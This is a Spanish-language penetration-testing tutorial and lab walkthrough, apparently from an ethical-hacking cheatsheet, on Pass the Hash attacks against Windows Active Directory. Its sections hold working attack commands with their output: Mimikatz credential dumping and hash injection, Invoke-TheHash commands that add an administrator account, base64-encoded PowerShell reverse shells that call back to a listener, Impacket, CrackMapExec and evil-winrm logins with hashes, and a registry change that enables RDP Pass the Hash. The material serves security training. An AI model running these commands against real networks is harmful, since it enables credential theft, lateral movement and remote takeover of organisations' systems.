
# Pass the Hash (PtH)

Un ataque [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) es una técnica en la que un atacante utiliza un hash de contraseña en lugar de la contraseña de texto sin formato para la autenticación. El atacante no necesita descifrar el hash para obtener una contraseña en texto plano. Los ataques PtH explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático para cada sesión hasta que se cambia la contraseña.

Como se analizó en las secciones anteriores, el atacante debe tener privilegios administrativos o privilegios particulares en la máquina de destino para obtener un hash de contraseña. Los hashes se pueden obtener de varias formas, entre ellas:

* Volcar la base de datos SAM local desde un host comprometido.
* Extracción de hashes de la base de datos NTDS (`ntds.dit`) en un controlador de dominio.
* Extrayendo los hashes de la memoria (`lsass.exe`).

Supongamos que obtenemos el hash de contraseña ( `64F12CDDAA88057E06A81B54E73B949B`) para del usuario `julio` del dominio `inlanefreight.htb`. Veamos cómo podemos realizar ataques Pass the Hash desde máquinas con Windows y Linux.

<figure><img src="/files/5H1ulH0oZmvcNg1u3GOY" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Introducción a NTLM de Windows</mark>

[Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) de Microsoft es un conjunto de protocolos de seguridad que autentica las identidades de los usuarios y al mismo tiempo protege la integridad y confidencialidad de sus datos. NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin que este proporcione una contraseña.

A pesar de sus defectos conocidos, NTLM todavía se usa comúnmente para garantizar la compatibilidad con clientes y servidores heredados, incluso en sistemas modernos. Si bien Microsoft continúa admitiendo NTLM, Kerberos ha asumido el control como mecanismo de autenticación predeterminado en Windows 2000 y dominios posteriores de Active Directory (AD).

Con NTLM, las contraseñas almacenadas en el servidor y el controlador de dominio no están "saltadas", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto lo llamamos `Pass the Hash (PtH) Attack`.

***

## <mark style="color:purple;">Pass the Hash con Mimikatz (Windows)</mark>

La primera herramienta que utilizaremos para realizar un ataque Pass the Hash es [Mimikatz](https://github.com/gentilkiwi) . Mimikatz tiene un módulo llamado `sekurlsa::pth`que nos permite realizar un ataque Pass the Hash iniciando un proceso usando el hash de la contraseña del usuario. Para utilizar este módulo, necesitaremos lo siguiente:

* `/user`- El nombre de usuario que queremos suplantar.
* `/rc4`o `/NTLM`- hash NTLM de la contraseña del usuario.
* `/domain`- Dominio al que pertenece el usuario a suplantar. En el caso de una cuenta de usuario local, podemos usar el nombre de la computadora, localhost o un punto (.).
* `/run`- El programa que queremos ejecutar con el contexto del usuario (si no se especifica, ejecutará cmd.exe).

```shell-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Ahora podemos usar `cmd.exe` para ejecutar comandos en el contexto del usuario. Para este ejemplo, `julio` puede conectarse a una carpeta compartida denominada `julio` en el DC.

![texto](https://academy.hackthebox.com/storage/modules/147/pth_julio.jpg)

***

## <mark style="color:purple;">Pass the Hash con PowerShell Invoke-TheHash (Windows)</mark>

Otra herramienta que podemos utilizar para realizar ataques Pass the Hash en Windows es [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) . Esta herramienta es una colección de funciones de PowerShell para realizar ataques Pass the Hash con WMI y SMB. Se accede a las conexiones WMI y SMB a través de .NET TCPClient. La autenticación se realiza pasando un hash NTLM al protocolo de autenticación NTLMv2. Los privilegios de administrador local no son necesarios en el lado del cliente, pero el usuario y el hash que utilizamos para autenticar deben tener derechos administrativos en la computadora de destino. Para este ejemplo usaremos el usuario `julio` y el hash `64F12CDDAA88057E06A81B54E73B949B`.

Al usar `Invoke-TheHash`, tenemos dos opciones: ejecución de comando SMB o WMI. Para utilizar esta herramienta, debemos especificar los siguientes parámetros para ejecutar comandos en la computadora de destino:

* `-Target`: Nombre de host o dirección IP del objetivo.
* `-Username`: Nombre de usuario a utilizar para la autenticación.
* `-Domain`: Dominio a utilizar para la autenticación. Este parámetro no es necesario con cuentas locales o cuando se utiliza @dominio después del nombre de usuario.
* `-Hash`: Hash de contraseña NTLM para autenticación. Esta función aceptará el formato LM:NTLM o NTLM.
* `-Command`: Comando a ejecutar sobre el objetivo. Si no se especifica un comando, la función verificará si el nombre de usuario y el hash tienen acceso a WMI en el destino.

El siguiente comando utilizará el método SMB para la ejecución del comando para crear un nuevo usuario llamado mark y agregarlo al grupo de Administradores.

## <mark style="color:purple;">**Invoke-TheHash con SMB**</mark>

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

También podemos obtener una conexión de shell inversa en la máquina de destino. Si no estás familiarizado con los Reverse Shells, revisa el módulo [Shells y Payloads](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads.md).

Para obtener un Reverse Shell, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la dirección IP 172.16.1.5. Usaremos el puerto 8001 para esperar la conexión.

### **Listener con Netcat**

```powershell
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

Para crear un shell inverso simple usando PowerShell, podemos visitar <https://www.revshells.com/> , configurar nuestra IP `172.16.1.5`y puerto `8001`, y seleccionar la opción `PowerShell #3 (Base64)`, como se muestra en la siguiente imagen.

![texto](https://academy.hackthebox.com/storage/modules/147/rshellonline.jpg)

Ahora podemos ejecutar `Invoke-TheHash` para ejecutar nuestro script de shell inverso de PowerShell en la computadora de destino. Tenga en cuenta que en lugar de proporcionar la dirección IP, que es `172.16.1.10`, usaremos el nombre de la máquina `DC01`(cualquiera de los dos funcionaría).

## <mark style="color:purple;">**Invoke-TheHash con WMI**</mark>

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10).

![texto](https://academy.hackthebox.com/storage/modules/147/pth_invoke_the_hash.jpg)

***

## <mark style="color:purple;">Pass the Hash con Impacket (Linux)</mark>

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene varias herramientas que podemos usar para diferentes operaciones como `Command Execution`y `Credential Dumping`, `Enumeration`etc. Para este ejemplo, realizaremos la ejecución de comandos en la máquina de destino usando `PsExec`.

### **Pass the Hash con Impacket PsExec**

```shell-session
afsh4ck@kali$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Hay varias otras herramientas en el kit de herramientas de Impacket que podemos usar para la ejecución de comandos mediante ataques Pass the Hash, como:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

***

## <mark style="color:purple;">Pass the Hash con CrackMapExec (Linux)</mark>

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) es una herramienta posterior a la explotación que ayuda a automatizar la evaluación de la seguridad de grandes redes de Active Directory. Podemos usar CrackMapExec para intentar autenticarnos en algunos o todos los hosts de una red buscando un host donde podamos autenticarnos exitosamente como administrador local. Este método también se denomina "Password Spraying" y lo trato en profundidad en el módulo [`Password Spraying`](/ethical-hacking-cheatsheet/active-directory/active-directory/password-spraying.md). Ten en cuenta que este método puede bloquear cuentas de dominio, así que tenga en cuenta la política de bloqueo de cuentas del dominio de destino y asegúrese de utilizar el método de cuenta local, que intentará solo un intento de inicio de sesión en un host en un rango determinado utilizando las credenciales proporcionadas si es así. es tu intención.

### **Pass the Hash con CrackMapExec**

```shell-session
afsh4ck@kali$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Si queremos realizar las mismas acciones pero intentamos autenticarnos en cada host en una subred usando el hash de contraseña del administrador local, podríamos agregar `--local-auth` a nuestro comando. Este método es útil si obtenemos un hash de administrador local volcando la base de datos SAM local en un host y queremos verificar a cuántos (si los hay) otros hosts podemos acceder debido a la reutilización de la contraseña del administrador local.&#x20;

Si vemos `Pwn3d!`, significa que el usuario es un administrador local en la computadora de destino. Podemos usar la opción `-x` para ejecutar comandos. Es común ver la reutilización de contraseñas en muchos hosts en la misma subred. Las organizaciones suelen utilizar la misma contraseña de administrador local o establecer esta contraseña de la misma manera en varios hosts para facilitar la administración. Si nos encontramos con este problema en un compromiso del mundo real, una gran recomendación para el cliente es implementar la [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) , que aleatoriza la contraseña del administrador local y se puede configurar para que rote en un intervalo fijo.

### **CrackMapExec - Ejecución de comandos**

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Revise la [Wiki de documentación de CrackMapExec](https://wiki.porchetta.industries/) para obtener más información sobre las amplias funciones de la herramienta.

***

## <mark style="color:purple;">Pass the Hash con evil-winrm (Linux)</mark>

[evil-winrm](https://github.com/Hackplayers/evil-winrm) es otra herramienta que podemos usar para autenticarnos mediante el ataque Pass the Hash con comunicación remota de PowerShell. Si SMB está bloqueado o no tenemos derechos administrativos, podemos usar este protocolo alternativo para conectarnos a la máquina de destino.

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

{% hint style="info" %}
**Nota**: Cuando utilizamos una cuenta de dominio, debemos incluir el nombre del dominio, por ejemplo: <administrador@inlanefreight.htb>
{% endhint %}

***

## <mark style="color:purple;">Pass the Hash con RDP (Linux)</mark>

Podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Hay algunas advertencias sobre este ataque:

* `Restricted Admin Mode`, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin`(REG\_DWORD) `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`con el valor de 0. Se puede hacer usando el siguiente comando:

### **Habilita el modo de administración restringido para permitir PtH**

```powershell
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/147/rdp_session-5.png)

Una vez agregada la clave de registro, podemos usar en `xfreerdp` la opción `/pth` para obtener acceso RDP:

### **Pass the Hash con RDP**

```shell-session
afsh4ck@kali$ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![](https://academy.hackthebox.com/storage/modules/147/rdp_session_new.jpg)

***

## <mark style="color:purple;">Límites de UAC en Pass the Hash para cuentas locales</mark>

UAC (User Account Control) limita la capacidad de los usuarios locales para realizar operaciones de administración remota. Cuando la clave de registro `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` se establece en 0, significa que la cuenta de administrador local integrada (RID-500, "Administrador") es la única cuenta local permitida para realizar tareas de administración remota. Establecerlo en 1 también permite a los demás administradores locales.

{% hint style="info" %}
**Nota**: Hay una excepción: si la clave de registro `FilterAdministratorToken` (deshabilitada de forma predeterminada) está habilitada (valor 1), la cuenta RID 500 (incluso si se le cambia el nombre) se inscribe en la protección UAC. Esto significa que el PTH remoto fallará en la máquina cuando se use esa cuenta.
{% endhint %}

Estas configuraciones son solo para cuentas administrativas locales. Si obtenemos acceso a una cuenta de dominio con derechos administrativos en una máquina, aún podemos usar Pass the Hash en esa máquina. Si desea obtener más información sobre LocalAccountTokenFilterPolicy, puede leer la publicación del blog de Will Schroeder [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167) .

***

## <mark style="color:purple;">Caso práctico</mark>

Vamos a poner en práctica nuestras habilidades en Pass the Hash

```
Host:     10.129.212.20
Usuario:  Administrator 
Hash:     30B3783CE2ABF1AF70F77D0660CF3453
```

### <mark style="color:purple;">Pregunta 1</mark>

> Accede a la máquina utilizando cualquier herramienta Pass-the-Hash. Envía el contenido del archivo ubicado en `C:\pth.txt`.

```shell-session
afsh4ck@kali$ impacket-psexec administrator@10.129.212.20 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.212.20.....
[*] Found writable share ADMIN$
[*] Uploading file MDqzTDGQ.exe
[*] Opening SVCManager on 10.129.212.20.....
[*] Creating service nQKZ on 10.129.212.20.....
[*] Starting service nQKZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```powershell
C:\Windows\system32> cd /

C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\

10/04/2022  10:55 AM    <DIR>          inetpub
02/25/2022  11:20 AM    <DIR>          PerfLogs
10/04/2022  10:55 AM    <DIR>          Program Files
10/04/2022  10:55 AM    <DIR>          Program Files (x86)
09/26/2022  09:32 AM                18 pth.txt
10/25/2022  07:34 AM    <DIR>          tools
09/26/2022  09:16 AM    <DIR>          Users
04/02/2024  05:14 PM    <DIR>          Windows
               1 File(s)             18 bytes
               7 Dir(s)  17,979,506,688 bytes free

C:\> type C:\pth.txt   
G3t_4CCE$$_V1@_PTH
```

### <mark style="color:purple;">Pregunta 2</mark>

> Intenta conectarte a través de RDP usando el hash de administrador. ¿Cuál es el nombre del valor del registro que debe establecerse en 0 para que funcione PTH sobre RDP? Cambia el valor de la clave de registro y conéctate usando el hash con RDP. Envía el nombre del valor del registro como respuesta.

Al conectarnos con xfreerdp nos da este error, por lo que tendremos que conectarnos de nuevo y habilitar el `modo de administración restringido` para permitir PtH.

<figure><img src="/files/kkRJqdkonpJlzkzdmqQ4" alt=""><figcaption></figcaption></figure>

```shell-session
afsh4ck@kali$ impacket-psexec administrator@10.129.212.20 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.212.20.....
[*] Found writable share ADMIN$
[*] Uploading file CxfYdXeq.exe
[*] Opening SVCManager on 10.129.212.20.....
[*] Creating service QntM on 10.129.212.20.....
[*] Starting service QntM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

C:\Windows\system32> 
```

Ahora nos volvemos a conectar con xfreerdp y accedemos sin problema:

```bash
xfreerdp /v:10.129.212.20 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 
```

<figure><img src="/files/O2yJ1lLgsalqHOhBbvo7" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Pregunta 3</mark>

> Conéctate a través de RDP y usa Mimikatz ubicado en `c:\tools` para extraer los hashes presentados en la sesión actual. ¿Cuál es el hash NTLM/RC4 de la cuenta de David?

```powershell
PS C:\tools> ls

    Directory: C:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/23/2022   1:51 PM                Invoke-TheHash
-a----        10/7/2022   9:43 AM        8230912 chisel.exe
-a----        9/22/2022   1:12 PM        1355264 mimikatz.exe
-a----        9/22/2022   1:13 PM          45272 nc.exe
-a----        9/22/2022   1:14 PM         440832 Rubeus.exe

PS C:\tools> .\mimikatz.exe privilege::debug

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 292134 (00000000:00047526)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/2/2024 5:09:19 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0  # <---- El Hash NTLM
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f
 ...
```

### <mark style="color:purple;">Pregunta 4</mark>

> Usando el hash de David, realiza un ataque Pass the Hash para conectarte a la carpeta compartida `\DC01\david` y lee el archivo `david.txt`

```
mimikatz # sekurlsa::pth /user:david /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit
```

<figure><img src="/files/NsckQBYTXSudVcEIYFMo" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Pregunta 5</mark>

> Usando el hash de Julio, realiza un ataque Pass the Hash para conectarte a la carpeta compartida `\DC01\julio` y lee el archivo `julio.txt`

* Lo primero vamos a hacer un volcado de hashes con Mimikatz para encontrar el hash de julio

```powershell
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 313896 (00000000:0004ca28)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/3/2024 2:00:43 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b  # <---- El Hash
         * SHA1     : cba4e545b7ec918129725154b29f055e
```

```
mimikatz # sekurlsa::pth /user:julio /ntlm:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
```

<figure><img src="/files/5svq0wdi4Md8UrJBSlZw" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Pregunta final</mark>

> Usando el hash de Julio, realiza un ataque Pass the Hash, inicia una PowerShell e importa Invoke-TheHash para crear un Reverse Shell a la máquina a la que estás conectado a través de RDP (la máquina de destino, DC01, solo puede conectarse a MS01). Utilice la herramienta `nc.exe` ubicada en `c:\tools` para escuchar el Reverse Shell. Una vez conectado al DC01, lee la flag en `C:\julio\flag.txt`

<figure><img src="/files/UdquMMIwIiULNQ7E1CyE" alt=""><figcaption></figcaption></figure>

Ahora vamos a crearnos una reverse shell con <https://revshells.com> con la opción de Powershell #3 Base 64:

<figure><img src="/files/riU0ypfs2595iLfKBlx6" alt=""><figcaption></figcaption></figure>

{% code title="Terminal 1" %}

```powershell
# Iniciamos Listener de Netcat
PS C:\tools> .\nc.exe -nlvp 8001
```

{% endcode %}

{% code title="Terminal 2" %}

```powershell
# Pass the Hash con Reverse Shell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAyADkALgA4AC4ANgAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==="
```

{% endcode %}

<figure><img src="/files/rJ35CY0wJRyAt5K4hx2R" alt=""><figcaption></figcaption></figure>
